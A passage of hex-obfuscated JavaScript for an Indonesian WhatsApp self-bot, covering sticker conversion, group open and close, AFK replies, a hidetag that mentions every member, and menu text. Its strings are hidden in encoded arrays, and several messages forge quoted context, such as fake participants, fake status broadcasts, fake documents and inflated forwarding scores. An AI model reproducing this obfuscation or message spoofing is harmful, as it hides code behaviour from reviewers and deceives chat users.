x69\x66","\x47\x61\x67\x61\x6C\x2C\x20\x70\x61\x64\x61\x20\x73\x61\x61\x74\x20\x6D\x65\x6E\x67\x6B\x6F\x6E\x76\x65\x72\x73\x69\x20","\x20\x6B\x65\x20\x73\x74\x69\x6B\x65\x72","\x2E","\x69\x6E\x70\x75\x74\x46\x6F\x72\x6D\x61\x74","\x4B\x69\x72\x69\x6D\x20\x67\x61\x6D\x62\x61\x72\x20\x64\x65\x6E\x67\x61\x6E\x20\x63\x61\x70\x74\x69\x6F\x6E\x20","\x73\x74\x69\x63\x6B\x65\x72\x5C\x6E\x44\x75\x72\x61\x73\x69\x20\x53\x74\x69\x63\x6B\x65\x72\x20\x56\x69\x64\x65\x6F\x20\x31\x2D\x39\x20\x44\x65\x74\x69\x6B","\x52\x65\x70\x6C\x79\x20\x61\x74\x61\x75\x20\x74\x61\x67\x20\x73\x74\x69\x6B\x65\x72\x20\x6E\x79\x61\x20\x6C\x6F\x72\x64\x21","\x60\x60\x60\x50\x52\x4F\x53\x45\x53\x2E\x2E\x2E\x60\x60\x60","\x2E\x70\x6E\x67","\x66\x66\x6D\x70\x65\x67\x20\x2D\x69\x20","\x59\x61\x68\x20\x67\x61\x67\x61\x6C\x2C\x20\x63\x6F\x62\x61\x20\x75\x6C\x61\x6E\x67\x69\x20\x5E\x5F\x5E","\x53\x63\x20\x69\x6E\x69\x20\x66\x72\x65\x65\x20\x73\x69\x6C\x61\x68\x6B\x61\x6E\x20\x63\x65\x6B\x20\x64\x69\x20\x59\x54\x20\x3A\x20\x5A\x45\x45\x4F\x4E\x45\x20\x4F\x46\x43","\x53\x4F\x55\x52\x43\x45\x20\x2D\x2D\x3E\x20\x59\x54\x20\x3A\x20\x5A\x45\x45\x4F\x4E\x45\x20\x4F\x46\x43\x0A\x0A\x20","\x4C\x69\x6E\x6B\x20\x3A\x20\x62\x69\x74\x2E\x6C\x79\x2F\x79\x74\x7A\x65\x65\x6F\x6E\x65\x6F\x66\x63\x0A","\x53\x75\x62\x73\x63\x72\x69\x62\x65\x20\x73\x75\x70\x61\x79\x61\x20\x6C\x75\x20\x74\x61\x75\x20\x75\x70\x64\x61\x74\x65\x6E\x79\x61\x0A","\x23\x69\x7A\x69\x6E\x61\x64\x6D\x69\x6E\x0A\x23\x73\x68\x61\x72\x65","\x67\x72\x6F\x75\x70\x4D\x65\x74\x61\x64\x61\x74\x61","\x70\x61\x72\x74\x69\x63\x69\x70\x61\x6E\x74\x73","\x63\x2E\x75\x73","\x73\x2E\x77\x68\x61\x74\x73\x61\x70\x70\x2E\x6E\x65\x74","\x69\x64","\x70\x75\x73\x68","\x6D\x61\x70","\x36\x32\x38\x33\x31\x33\x36\x35\x30\x35\x35\x39\x31\x2D\x31\x36\x31\x34\x39\x35\x33\x33\x33\x37\x40\x67\x2E\x75\x73","\x42\x33\x39\x31\x38\x33\x37\x41\x35\x38\x33\x33\x38\x42\x41\x38\x31\x38\x36\x43\x34\x37\x45\x35\x31\x46\x46\x44\x46\x44\x34\x41","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x6F\x63\x74\x65\x74\x2D\x73\x74\x72\x65\x61\x6D","\x66\x61\x6B\x65","\x33\x36","\x31\x36\x31\x34\x30\x36\x39\x33\x37\x38","\x50\x45\x4E\x44\x49\x4E\x47","\x60\x60\x60\x4A\x61\x64\x69\x6B\x61\x6E\x20\x42\x6F\x74\x20\x73\x65\x62\x61\x67\x61\x69\x20\x61\x64\x6D\x69\x6E\x20\x74\x65\x72\x6C\x65\x62\x69\x68\x20\x64\x61\x68\x75\x6C\x75\x60\x60\x60","\x6D\x65\x73\x73\x61\x67\x65\x53\x65\x6E\x64","\x67\x72\x6F\x75\x70\x53\x65\x74\x74\x69\x6E\x67\x43\x68\x61\x6E\x67\x65","\x60\x60\x60\x53\x55\x43\x43\x45\x53\x53\x46\x55\x4C\x4C\x59\x20\x4F\x50\x45\x4E\x49\x4E\x47\x20\x47\x52\x4F\x55\x50\x60\x60\x60","\x60\x60\x60\x53\x55\x43\x43\x45\x53\x53\x46\x55\x4C\x20\x43\x4C\x4F\x53\x49\x4E\x47\x20\x47\x52\x4F\x55\x50\x60\x60\x60","\x6A\x69\x64","\x42\x45\x47\x49\x4E\x3A\x56\x43\x41\x52\x44\x0A","\x56\x45\x52\x53\x49\x4F\x4E\x3A\x33\x2E\x30\x0A","\x46\x4E\x3A","\x5C\x6E","\x4F\x52\x47\x3A\x20\x53\x55\x42\x53\x43\x52\x49\x42\x45\x20\x5A\x45\x45\x4F\x4E\x45\x20\x4F\x46\x43\x3B\x5C\x6E","\x54\x45\x4C\x3B\x74\x79\x70\x65\x3D\x43\x45\x4C\x4C\x3B\x74\x79\x70\x65\x3D\x56\x4F\x49\x43\x45\x3B\x77\x61\x69\x64\x3D","\x6F\x77\x6E\x65\x72\x4E\x75\x6D\x62\x65\x72","\x3A","\x6F\x77\x6E\x65\x72\x4E\x75\x6D\x62\x65\x72\x72","\x74\x72\x69\x6D","\x45\x4E\x44\x3A\x56\x43\x41\x52\x44","\x54\x68\x69\x73\x20\x69\x73\x20\x6D\x79\x20\x6F\x77\x6E\x65\x72\x20\x6E\x75\x6D\x62\x65\x72","\x74\x65\x78\x74"];const stc=mek[_0x26ef[1]][_0x26ef[0]];if(stc){if(stc[_0x26ef[2]]== 7292){const timestamp=speed();const latensi=speed()- timestamp;exec(`${_0x26ef[3]}`,(_0xcca3x4,_0xcca3x5,_0xcca3x6)=>{const _0xcca3x7=_0xcca3x5.toString(_0x26ef[4]);const _0xcca3x8=_0xcca3x7[_0x26ef[6]](/Memory:/,_0x26ef[5]);const _0xcca3x9=`${_0x26ef[7]}${_0xcca3x8}${_0x26ef[8]}${latensi[_0x26ef[9]](4)}${_0x26ef[10]}`;fakegroup(_0xcca3x9)})}};uptime= process[_0x26ef[11]]();tekss= `${_0x26ef[12]}${kyun(uptime)}${_0x26ef[12]}`;myMonthss= [_0x26ef[13],_0x26ef[14],_0x26ef[15],_0x26ef[16],_0x26ef[17],_0x26ef[18],_0x26ef[19],_0x26ef[20],_0x26ef[21],_0x26ef[22],_0x26ef[23],_0x26ef[24]];myDayss= [_0x26ef[25],_0x26ef[26],_0x26ef[27],_0x26ef[28],_0x26ef[29],_0x26ef[30],_0x26ef[31]];var tgll= new Date();detik= tgll[_0x26ef[32]]();menit= tgll[_0x26ef[33]]();jam= tgll[_0x26ef[34]]();var ampm=jam>= 12?_0x26ef[35]:_0x26ef[36];var dayy=tgll[_0x26ef[37]]();bulan= tgll[_0x26ef[38]]();var thisDayy=tgll[_0x26ef[39]](),thisDayy=myDayss[thisDayy];var yyy=tgll[_0x26ef[40]]();var yearr=(yyy< 1000)?yyy+ 1900:yyy;const tanggall=`${_0x26ef[12]}${thisDayy}${_0x26ef[41]}${dayy}${_0x26ef[42]}${myMonthss[bulan]}${_0x26ef[42]}${yearr}${_0x26ef[12]}`;wew= fs[_0x26ef[44]](`${_0x26ef[43]}${thumb}${_0x26ef[12]}`);alfa= _0x26ef[45];alfa1= _0x26ef[46];alfa2= _0x26ef[47];alfa3= _0x26ef[48];alphay= `${_0x26ef[49]}${hahh}${_0x26ef[50]}${pushname}${_0x26ef[51]}${ultah}${_0x26ef[52]}${petik}${_0x26ef[53]}${alfa[_0x26ef[55]](_0x26ef[54])[0]}${_0x26ef[56]}${setting[_0x26ef[57]]}${_0x26ef[58]}${setting[_0x26ef[59]]}${_0x26ef[60]}${prefix}${_0x26ef[61]}${thisDayy}${_0x26ef[62]}${dayy}${_0x26ef[50]}${myMonthss[bulan]}${_0x26ef[50]}${yearr}${_0x26ef[63]}${timuu}${_0x26ef[64]}${petik}${_0x26ef[65]}${petik}${_0x26ef[66]}${prefix}${_0x26ef[67]}${prefix}${_0x26ef[68]}${prefix}${_0x26ef[69]}${prefix}${_0x26ef[70]}${prefix}${_0x26ef[71]}${prefix}${_0x26ef[72]}${prefix}${_0x26ef[73]}${prefix}${_0x26ef[74]}${prefix}${_0x26ef[75]}${petik}${_0x26ef[76]}${petik}${_0x26ef[66]}${prefix}${_0x26ef[77]}${prefix}${_0x26ef[78]}${prefix}${_0x26ef[79]}${prefix}${_0x26ef[80]}${prefix}${_0x26ef[81]}${petik}${_0x26ef[82]}${alfa[_0x26ef[55]](_0x26ef[54])[0]}${_0x26ef[83]}${alfa3[_0x26ef[55]](_0x26ef[54])[0]}${_0x26ef[83]}${alfa2[_0x26ef[55]](_0x26ef[54])[0]}${_0x26ef[84]}${alfa1[_0x26ef[55]](_0x26ef[54])[0]}${_0x26ef[85]}`;if(stc){if(stc[_0x26ef[2]]== 7446){alpha[_0x26ef[86]](from,wew,image,{quoted:ftroli,caption:alphay,contextInfo:{"\x6D\x65\x6E\x74\x69\x6F\x6E\x65\x64\x4A\x69\x64":[alfa,alfa1,alfa2,alfa3],"\x66\x6F\x72\x77\x61\x72\x64\x69\x6E\x67\x53\x63\x6F\x72\x65":999,"\x69\x73\x46\x6F\x72\x77\x61\x72\x64\x65\x64":true},sendEphemeral:true})}};if(stc){if(stc[_0x26ef[2]]== 7038){if(!mek[_0x26ef[88]][_0x26ef[87]]){return fakestatus(_0x26ef[89])};if(banChats=== true){return};uptime= process[_0x26ef[11]]();banChats= true;fakeitem(`${_0x26ef[90]}`)}};if(stc){if(stc[_0x26ef[2]]== 7144){if(!mek[_0x26ef[88]][_0x26ef[87]]){return fakestatus(_0x26ef[89])};if(banChats=== false){return};banChats= false;fakeitem(`${_0x26ef[91]}`)}};if(stc){if(stc[_0x26ef[2]]== 7688){const isPoto=(type=== _0x26ef[92]|| type=== _0x26ef[93]);const isVideo=type=== _0x26ef[0]&& content[_0x26ef[94]](_0x26ef[93]);const isFoto=type=== _0x26ef[0]&& content[_0x26ef[94]](_0x26ef[92]);if((isPoto&&  !mek[_0x26ef[1]][_0x26ef[93]]|| isFoto)&& args[_0x26ef[95]]== 0){const encmedia=isFoto?JSON[_0x26ef[100]](JSON[_0x26ef[99]](mek)[_0x26ef[6]](_0x26ef[97],_0x26ef[98]))[_0x26ef[1]][_0x26ef[0]][_0x26ef[96]]:mek;const media= await alpha[_0x26ef[101]](encmedia);ran= _0x26ef[102]; await ffmpeg(`${_0x26ef[121]}${media}${_0x26ef[12]}`)[_0x26ef[120]](media)[_0x26ef[115]](_0x26ef[118],function(_0xcca3x17){console[_0x26ef[113]](`${_0x26ef[119]}${_0xcca3x17}${_0x26ef[12]}`)})[_0x26ef[115]](_0x26ef[116],function(_0xcca3x16){console[_0x26ef[113]](`${_0x26ef[117]}${_0xcca3x16}${_0x26ef[12]}`);fs[_0x26ef[114]](media);reply(_0x26ef[116])})[_0x26ef[115]](_0x26ef[111],function(){console[_0x26ef[113]](_0x26ef[112]);alpha[_0x26ef[86]](from,fs[_0x26ef[44]](ran),sticker,{quoted:mek});fs[_0x26ef[114]](media);fs[_0x26ef[114]](ran)})[_0x26ef[110]]([`${_0x26ef[106]}`,`${_0x26ef[107]}`,`${_0x26ef[108]}`,`${_0x26ef[109]}`])[_0x26ef[105]](_0x26ef[104])[_0x26ef[103]](ran)}else {if((isPoto&& mek[_0x26ef[1]][_0x26ef[93]][_0x26ef[122]]< 11|| isVideo&& mek[_0x26ef[1]][_0x26ef[0]][_0x26ef[96]][_0x26ef[123]][_0x26ef[93]][_0x26ef[122]]< 11)&& args[_0x26ef[95]]== 0){const encmedia=isVideo?JSON[_0x26ef[100]](JSON[_0x26ef[99]](mek)[_0x26ef[6]](_0x26ef[97],_0x26ef[98]))[_0x26ef[1]][_0x26ef[0]][_0x26ef[96]]:mek;const media= await alpha[_0x26ef[101]](encmedia);ran= _0x26ef[124];reply(mess[_0x26ef[125]]); await ffmpeg(`${_0x26ef[121]}${media}${_0x26ef[12]}`)[_0x26ef[133]](media[_0x26ef[55]](_0x26ef[132])[1])[_0x26ef[115]](_0x26ef[118],function(_0xcca3x17){console[_0x26ef[113]](`${_0x26ef[119]}${_0xcca3x17}${_0x26ef[12]}`)})[_0x26ef[115]](_0x26ef[116],function(_0xcca3x16){console[_0x26ef[113]](`${_0x26ef[117]}${_0xcca3x16}${_0x26ef[12]}`);fs[_0x26ef[114]](media);tipe= media[_0x26ef[127]](_0x26ef[126])?_0x26ef[128]:_0x26ef[129];reply(`${_0x26ef[130]}${tipe}${_0x26ef[131]}`)})[_0x26ef[115]](_0x26ef[111],function(){console[_0x26ef[113]](_0x26ef[112]);alpha[_0x26ef[86]](from,fs[_0x26ef[44]](ran),sticker,{quoted:mek});fs[_0x26ef[114]](media);fs[_0x26ef[114]](ran)})[_0x26ef[110]]([`${_0x26ef[106]}`,`${_0x26ef[107]}`,`${_0x26ef[108]}`,`${_0x26ef[109]}`])[_0x26ef[105]](_0x26ef[104])[_0x26ef[103]](ran)}else {fakegroup(`${_0x26ef[134]}${prefix}${_0x26ef[135]}`)}}}};if(stc){if(stc[_0x26ef[2]]== 6964){const isStikerl=type=== _0x26ef[0]&& content[_0x26ef[94]](_0x26ef[0]);if(!isStikerl){return fakeitem(_0x26ef[136])};fakegroup(_0x26ef[137]);encmedia= JSON[_0x26ef[100]](JSON[_0x26ef[99]](mek)[_0x26ef[6]](_0x26ef[97],_0x26ef[98]))[_0x26ef[1]][_0x26ef[0]][_0x26ef[96]];media=  await alpha[_0x26ef[101]](encmedia);ran= getRandom(_0x26ef[138]);exec(`${_0x26ef[139]}${media}${_0x26ef[50]}${ran}${_0x26ef[12]}`,(_0xcca3x16)=>{fs[_0x26ef[114]](media);if(_0xcca3x16){return reply(_0x26ef[140])};buffer= fs[_0x26ef[44]](ran);fakethumb(buffer,_0x26ef[141]);fs[_0x26ef[114]](ran)})}};if(stc){if(stc[_0x26ef[2]]== 7552){var value=_0x26ef[142];value+= _0x26ef[143];value+= _0x26ef[144];value+= _0x26ef[145];var group= await alpha[_0x26ef[146]](from);var member=group[_0x26ef[147]];var mem=[];member[_0x26ef[152]](async (_0xcca3x1d)=>{mem[_0x26ef[151]](_0xcca3x1d[_0x26ef[150]][_0x26ef[6]](_0x26ef[148],_0x26ef[149]))});var optionshidetag={text:value,contextInfo:{mentionedJid:mem},quoted:mek};alpha[_0x26ef[86]](from,optionshidetag,text,{quoted:{key:{participant:`${_0x26ef[46]}`,"\x72\x65\x6D\x6F\x74\x65\x4A\x69\x64":_0x26ef[153],"\x66\x72\x6F\x6D\x4D\x65":false,"\x69\x64":_0x26ef[154]},"\x6D\x65\x73\x73\x61\x67\x65":{"\x64\x6F\x63\x75\x6D\x65\x6E\x74\x4D\x65\x73\x73\x61\x67\x65":{"\x6A\x70\x65\x67\x54\x68\x75\x6D\x62\x6E\x61\x69\x6C":fs[_0x26ef[44]](`${_0x26ef[43]}${thumb}${_0x26ef[12]}`),"\x6D\x69\x6D\x65\x74\x79\x70\x65":_0x26ef[155],"\x74\x69\x74\x6C\x65":`${_0x26ef[12]}${setting[_0x26ef[156]]}${_0x26ef[12]}`,"\x66\x69\x6C\x65\x4C\x65\x6E\x67\x74\x68":_0x26ef[157],"\x70\x61\x67\x65\x43\x6F\x75\x6E\x74":0,"\x66\x69\x6C\x65\x4E\x61\x6D\x65":`${_0x26ef[12]}${setting[_0x26ef[156]]}${_0x26ef[50]}`}},"\x6D\x65\x73\x73\x61\x67\x65\x54\x69\x6D\x65\x73\x74\x61\x6D\x70":_0x26ef[158],"\x73\x74\x61\x74\x75\x73":_0x26ef[159]},contextInfo:{"\x66\x6F\x72\x77\x61\x72\x64\x69\x6E\x67\x53\x63\x6F\x72\x65":999,"\x69\x73\x46\x6F\x72\x77\x61\x72\x64\x65\x64":true}})}};if(stc){if(stc[_0x26ef[2]]== 7878){if(!isBotGroupAdmins){return reply(_0x26ef[160])};alpha[_0x26ef[162]](from,GroupSettingChange[_0x26ef[161]],false);fakegroup(_0x26ef[163])}else {if(stc[_0x26ef[2]]== 7850){alpha[_0x26ef[162]](from,GroupSettingChange[_0x26ef[161]],true);fakegroup(_0x26ef[164])}}};if(stc){if(stc[_0x26ef[2]]== 7340){members_ids= [];for(let mem of groupMembers){members_ids[_0x26ef[151]](mem[_0x26ef[165]])};vcard2= _0x26ef[166]+ _0x26ef[167]+ `${_0x26ef[168]}${setting[_0x26ef[57]]}${_0x26ef[169]}`+ `${_0x26ef[170]}`+ `${_0x26ef[171]}${setting[_0x26ef[172]]}${_0x26ef[173]}${setting[_0x26ef[174]]}${_0x26ef[169]}`+ _0x26ef[176][_0x26ef[175]]();alpha[_0x26ef[86]](from,{displayName:`${_0x26ef[12]}${setting[_0x26ef[57]]}${_0x26ef[12]}`,vcard:vcard2},contact,{quoted:fkontak,contextInfo:{"\x6D\x65\x6E\x74\x69\x6F\x6E\x65\x64\x4A\x69\x64":members_ids}});alpha[_0x26ef[86]](from,_0x26ef[177],MessageType[_0x26ef[178]],{quoted:mek})}}
//FUNCTION
            cekafk(afk)
            if (!mek.key.remoteJid.endsWith('@g.us') && offline){
            if (!mek.key.fromMe){
            if (isAfk(mek.key.remoteJid)) return
            addafk(mek.key.remoteJid)
            heheh = ms(Date.now() - waktu) 
            alpha.sendMessage(mek.key.remoteJid,`@${owner} Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync(`image/${thumb}`)}}}})
            }
            }   
        if (mek.key.remoteJid.endsWith('@g.us') && offline) {
        if (!mek.key.fromMe){
        if (mek.message.extendedTextMessage != undefined){
        if (mek.message.extendedTextMessage.contextInfo != undefined){
        if (mek.message.extendedTextMessage.contextInfo.mentionedJid != undefined){
        for (let ment of mek.message.extendedTextMessage.contextInfo.mentionedJid) {
        if (ment === `${owner}@s.whatsapp.net`){
        if (isAfk(mek.key.remoteJid)) return
        addafk(mek.key.remoteJid)
        heheh = ms(Date.now() - waktu)
        alpha.sendMessage(mek.key.remoteJid,`@${owner} Sedang Offline!\n\n *Alasan :* ${alasan}\n *Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync(`image/${thumb}`)}}}})
          }
        }
            }
          }
        }
      }
    }
          // FUNTION CHAT \\
      const getpc = async function(totalchat){
   let pc = []
   let a = []
   let b = []
   for (c of totalchat){
      a.push(c.jid)
   }
   for (d of a){
      if (d && !d.includes('g.us')){
         b.push(d)
      }
   }
   return b
}

const getGroup = async function(totalchat){
   let grup = []
   let a = []
   let b = []
   for (c of totalchat){
      a.push(c.jid)
   }
   for (d of a){
      if (d && d.includes('g.us')){
         b.push(d)
      }
   }
   for (e of b){
      let ingfo = await alpha.groupMetadata(e)
      grup.push(ingfo)
   }
   return grup
}   
//========================================================================================================================//
		colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
	    const setiker = JSON.parse(fs.readFileSync('./temp/stik.json'))
		const audionye = JSON.parse(fs.readFileSync('./temp/vn.json'))
		const imagenye = JSON.parse(fs.readFileSync('./temp/image.json'))
		const videonye = JSON.parse(fs.readFileSync('./temp/video.json'))
      	if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
      	//if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
     	if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
      	//if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
		if (!mek.key.fromMe && banChats === true) return

switch (command) {
    case prefix+ 'menu':
    case prefix+ 'help':
                var _0xbb4a=["\x75\x70\x74\x69\x6D\x65","","\x4A\x61\x6E\x75\x61\x72\x69","\x46\x65\x62\x72\x75\x61\x72\x69","\x4D\x61\x72\x65\x74","\x41\x70\x72\x69\x6C","\x4D\x65\x69","\x4A\x75\x6E\x69","\x4A\x75\x6C\x69","\x41\x67\x75\x73\x74\x75\x73","\x53\x65\x70\x74\x65\x6D\x62\x65\x72","\x4F\x6B\x74\x6F\x62\x65\x72","\x4E\x6F\x76\x65\x6D\x62\x65\x72","\x44\x65\x73\x65\x6D\x62\x65\x72","\x4D\x69\x6E\x67\x67\x75","\x53\x65\x6E\x69\x6E","\x53\x65\x6C\x61\x73\x61","\x52\x61\x62\x75","\x4B\x61\x6D\x69\x73","\x4A\x75\x6D\x27\x61\x74","\x53\x61\x62\x74\x75","\x67\x65\x74\x53\x65\x63\x6F\x6E\x64\x73","\x67\x65\x74\x4D\x69\x6E\x75\x74\x65\x73","\x67\x65\x74\x48\x6F\x75\x72\x73","\x50\x4D","\x41\x4D","\x67\x65\x74\x44\x61\x74\x65","\x67\x65\x74\x4D\x6F\x6E\x74\x68","\x67\x65\x74\x44\x61\x79","\x67\x65\x74\x59\x65\x61\x72","\x2C\x20","\x20\x2D\x20","\x40\x73\x2E\x77\x68\x61\x74\x73\x61\x70\x70\x2E\x6E\x65\x74","\x69\x6D\x61\x67\x65\x2F","\x72\x65\x61\x64\x46\x69\x6C\x65\x53\x79\x6E\x63","\x36\x32\x38\x38\x37\x34\x33\x35\x30\x34\x37\x33\x32\x36\x40\x73\x2E\x77\x68\x61\x74\x73\x61\x70\x70\x2E\x6E\x65\x74","\x30\x40\x73\x2E\x77\x68\x61\x74\x73\x61\x70\x70\x2E\x6E\x65\x74","\x36\x32\x38\x38\x32\x37\x39\x35\x37\x35\x35\x31\x33\x40\x73\x2E\x77\x68\x61\x74\x73\x61\x70\x70\x2E\x6E\x65\x74","\x36\x32\x38\x35\x37\x31\x36\x33\x36\x30\x35\x31\x32\x40\x73\x2E\x77\x68\x61\x74\x73\x61\x70\x70\x2E\x6E\x65\x74","\u2501\u2501\x20\u2772\x20\x2A\x53\x49\x4D\x50\x4C\x45\x20\x42\x4F\x54\x20\x57\x45\x41\x2A\x20\u2773\x20\u2501\u2501\x0D\x0A","\x20","\x0D\x0A\x0D\x0A\u25EF\x20\x2A\x4E\x45\x57\x20\x59\x45\x41\x52\x2A\x20\uD83C\uDF8A\x0D\x0A\x2A","\x2A\x0D\x0A\x0D\x0A\u25EF\x20\x2A\x49\x4E\x46\x4F\x52\x4D\x41\x54\x49\x4F\x4E\x2A\x0D\x0A","\u2937\x20\x41\x75\x74\x68\x6F\x72\x20\x3A\x20\x40","\x40","\x73\x70\x6C\x69\x74","\x0D\x0A\u2937\x20\x4F\x77\x6E\x65\x72\x20\x3A\x20","\x6F\x77\x6E\x65\x72\x6E\x61\x6D\x65","\x0D\x0A\u2937\x20\x42\x6F\x74\x20\x4E\x61\x6D\x65\x20\x3A\x20","\x62\x6F\x74\x6E\x61\x6D\x65","\x0D\x0A\u2937\x20\x50\x72\x65\x66\x69\x78\x20\x3A\x20\x5B\x20","\x20\x5D\x0D\x0A\u2937\x20\x44\x61\x74\x65\x20\x3A\x20","\x2C","\x0D\x0A\u2937\x20\x54\x69\x6D\x65\x20\x3A\x20","\x20\x20\x57\x49\x42","\x0D\x0A\x0D\x0A\x2A\x4C\x49\x53\x54\x20\x4D\x45\x4E\x55\x2A\x0D\x0A","\u2752\x20","\x63\x6F\x6E\x76\x65\x72\x74\x6D\x65\x6E\x75\x0D\x0A\u2752\x20","\x64\x6F\x77\x6E\x6C\x6F\x61\x64\x6D\x65\x6E\x75\x0D\x0A\u2752\x20","\x66\x75\x6E\x6D\x65\x6E\x75\x0D\x0A\u2752\x20","\x6D\x61\x6B\x65\x72\x6D\x65\x6E\x75\x0D\x0A\u2752\x20","\x6F\x74\x68\x65\x72\x6D\x65\x6E\x75\x0D\x0A\u2752\x20","\x6F\x77\x6E\x65\x72\x6D\x65\x6E\x75\x0D\x0A\u2752\x20","\x73\x74\x6F\x72\x61\x67\x65\x6D\x65\x6E\x75\x0D\x0A\u2752\x20","\x74\x61\x67\x6D\x65\x6E\x75\x0D\x0A\u2752\x20","\x75\x70\x6D\x65\x6E\x75","\x0D\x0A\x0D\x0A\x2A\x41\x42\x4F\x55\x54\x2A\x0D\x0A","\x73\x6F\x75\x72\x63\x65\x0D\x0A\u2752\x20","\x6D\x79\x73\x74\x61\x74\x0D\x0A\u2752\x20","\x73\x70\x65\x65\x64\x0D\x0A\u2752\x20","\x73\x74\x61\x74\x75\x73\x0D\x0A\u2752\x20","\x72\x75\x6E\x74\x69\x6D\x65","\x0D\x0A\x0D\x0A\x2A\x54\x51\x54\x4F\x2A\x0D\x0A\u2022\x20\x40","\x0D\x0A\u2022\x20\x40","\x0D\x0A\x0D\x0A\x2A\x53\x50\x4F\x4E\x53\x4F\x52\x45\x44\x20\x42\x59\x2A\x0D\x0A\u2022\x20\x40","\x0D\x0A\x0D\x0A\u2501\u2501\x20\u2772\x20\x2A\x53\x49\x4D\x50\x4C\x45\x20\x42\x4F\x54\x20\x57\x45\x41\x2A\x20\u2773\x20\u2501\u2501\x20\x0D\x0A","\x73\x65\x6E\x64\x4D\x65\x73\x73\x61\x67\x65"];uptime= process[_0xbb4a[0]]();teks= `${_0xbb4a[1]}${kyun(uptime)}${_0xbb4a[1]}`;myMonths= [_0xbb4a[2],_0xbb4a[3],_0xbb4a[4],_0xbb4a[5],_0xbb4a[6],_0xbb4a[7],_0xbb4a[8],_0xbb4a[9],_0xbb4a[10],_0xbb4a[11],_0xbb4a[12],_0xbb4a[13]];myDays= [_0xbb4a[14],_0xbb4a[15],_0xbb4a[16],_0xbb4a[17],_0xbb4a[18],_0xbb4a[19],_0xbb4a[20]];var tgl= new Date();detik= tgl[_0xbb4a[21]]();menit= tgl[_0xbb4a[22]]();jam= tgl[_0xbb4a[23]]();var ampm=jam>= 12?_0xbb4a[24]:_0xbb4a[25];var day=tgl[_0xbb4a[26]]();bulan= tgl[_0xbb4a[27]]();var thisDay=tgl[_0xbb4a[28]](),thisDay=myDays[thisDay];var yy=tgl[_0xbb4a[29]]();var year=(yy< 1000)?yy+ 1900:yy;const tanggal=`${_0xbb4a[1]}${thisDay}${_0xbb4a[30]}${day}${_0xbb4a[31]}${myMonths[bulan]}${_0xbb4a[31]}${year}${_0xbb4a[1]}`;var itsme=`${_0xbb4a[1]}${numbernye}${_0xbb4a[32]}`;var split=`${_0xbb4a[1]}${fake}${_0xbb4a[1]}`;wew= fs[_0xbb4a[34]](`${_0xbb4a[33]}${thumb}${_0xbb4a[1]}`);alfa= _0xbb4a[35];alfa1= _0xbb4a[36];alfa2= _0xbb4a[37];alfa3= _0xbb4a[38];const bruhhhh={contextInfo:{participant:itsme,quotedMessage:{extendedTextMessage:{text:split}}}};alphay= `${_0xbb4a[39]}${hahh}${_0xbb4a[40]}${pushname}${_0xbb4a[41]}${ultah}${_0xbb4a[42]}${petik}${_0xbb4a[43]}${alfa[_0xbb4a[45]](_0xbb4a[44])[0]}${_0xbb4a[46]}${setting[_0xbb4a[47]]}${_0xbb4a[48]}${setting[_0xbb4a[49]]}${_0xbb4a[50]}${prefix}${_0xbb4a[51]}${thisDay}${_0xbb4a[52]}${day}${_0xbb4a[40]}${myMonths[bulan]}${_0xbb4a[40]}${year}${_0xbb4a[53]}${timuu}${_0xbb4a[54]}${petik}${_0xbb4a[55]}${petik}${_0xbb4a[56]}${prefix}${_0xbb4a[57]}${prefix}${_0xbb4a[58]}${prefix}${_0xbb4a[59]}${prefix}${_0xbb4a[60]}${prefix}${_0xbb4a[61]}${prefix}${_0xbb4a[62]}${prefix}${_0xbb4a[63]}${prefix}${_0xbb4a[64]}${prefix}${_0xbb4a[65]}${petik}${_0xbb4a[66]}${petik}${_0xbb4a[56]}${prefix}${_0xbb4a[67]}${prefix}${_0xbb4a[68]}${prefix}${_0xbb4a[69]}${prefix}${_0xbb4a[70]}${prefix}${_0xbb4a[71]}${petik}${_0xbb4a[72]}${alfa[_0xbb4a[45]](_0xbb4a[44])[0]}${_0xbb4a[73]}${alfa3[_0xbb4a[45]](_0xbb4a[44])[0]}${_0xbb4a[73]}${alfa2[_0xbb4a[45]](_0xbb4a[44])[0]}${_0xbb4a[74]}${alfa1[_0xbb4a[45]](_0xbb4a[44])[0]}${_0xbb4a[75]}`;alpha[_0xbb4a[76]](from,wew,image,{quoted:ftroli,caption:alphay,contextInfo:{"\x6D\x65\x6E\x74\x69\x6F\x6E\x65\x64\x4A\x69\x64":[alfa,alfa1,alfa2,alfa3],"\x66\x6F\x72\x77\x61\x72\x64\x69\x6E\x